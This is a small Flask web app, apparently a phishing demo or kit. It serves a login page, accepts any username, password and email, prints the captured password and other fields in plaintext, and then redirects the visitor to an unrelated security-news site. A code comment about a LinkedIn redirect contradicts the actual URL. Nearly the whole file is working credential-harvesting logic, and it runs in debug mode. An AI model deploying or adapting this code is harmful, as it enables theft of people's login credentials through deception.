from flask import Flask, request, jsonify, redirect, render_template

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('loginpage.html')

@app.route('/webbrowser', methods=['POST', 'GET'])
def send_input():
    username = request.form.get('username')
    password = request.form.get('password')
    email = request.form.get('email')

    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"Email: {email}")

    if username and password:
        print(f"Username: {username}, Email: {email}")
        # Redirect to LinkedIn Cybersecurity News page
        return redirect('https://thehackernews.com/')
    else:
        return jsonify({"error": "Invalid credentials"}), 400

if __name__ == '__main__':
    app.run(debug=True, port = 5000)
